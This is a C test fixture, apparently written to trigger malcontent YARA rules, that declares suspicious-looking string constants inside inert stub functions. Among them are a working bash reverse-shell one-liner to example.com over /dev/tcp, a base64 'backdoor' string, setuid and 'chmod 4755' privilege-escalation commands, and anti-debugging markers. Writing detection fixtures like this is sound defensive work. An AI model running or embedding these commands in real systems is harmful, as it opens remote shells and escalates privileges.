/*
 * WARNING: TEST FIXTURE — intentionally suspicious code.
 * DO NOT EXECUTE. Designed to trigger malcontent YARA rules.
 *
 * This file contains string literals that mimic command execution
 * and backdoor patterns. The functions are stubs and do nothing.
 */

#include <stdio.h>

/* Trigger: shell execution references */
static const char *SHELL_PATH = "/bin/sh";
static const char *SHELL_CMD = "/bin/bash -c 'whoami'";
static const char *REVERSE_SHELL = "/bin/bash -i >& /dev/tcp/example.com/4444 0>&1";

/* Trigger: base64-encoded payload (decodes to "echo backdoor_active") */
static const char *B64_PAYLOAD = "ZWNobyBiYWNrZG9vcl9hY3RpdmU=";

/* Trigger: process execution syscall references */
static const char *EXEC_FUNCS[] = {
    "execve",
    "execvp",
    "system",
    "popen",
    "fork",
    "ptrace",
};

/* Trigger: privilege escalation strings */
static const char *PRIVESC[] = {
    "setuid",
    "setgid",
    "sudo",
    "chmod 4755",
    "chown root",
};

/* Trigger: anti-analysis / evasion */
static const char *EVASION[] = {
    "/proc/self/status",
    "TracerPid",
    "LD_PRELOAD",
    "DYLD_INSERT_LIBRARIES",
};

void execute_backdoor(const char *cmd) {
    /* Stub — references exec patterns for YARA matching */
    (void)cmd;
    (void)SHELL_PATH;
    (void)SHELL_CMD;
    (void)REVERSE_SHELL;
    (void)B64_PAYLOAD;
    (void)EXEC_FUNCS;
    (void)PRIVESC;
    (void)EVASION;
}

void spawn_reverse_shell(const char *host, int port) {
    /* Stub — would open reverse shell */
    (void)host;
    (void)port;
    printf("backdoor: %s\n", SHELL_PATH);
}
